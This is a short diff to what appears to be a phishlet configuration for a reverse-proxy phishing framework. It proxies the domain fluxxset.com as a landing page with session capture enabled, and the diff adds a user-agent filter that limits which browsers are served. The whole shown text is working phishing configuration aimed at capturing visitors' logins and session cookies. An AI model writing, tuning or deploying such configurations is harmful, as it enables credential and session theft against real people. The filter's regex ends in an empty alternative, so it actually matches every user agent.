@@ -1,4 +1,5 @@
 min_ver: '3.0.0'
+ua_filter: '.*(Windows NT 10.0|CrOS|Macintosh|Windows NT 6.1|Ubuntu|).*' # case-insensitive, multiline
 proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'fluxxset.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
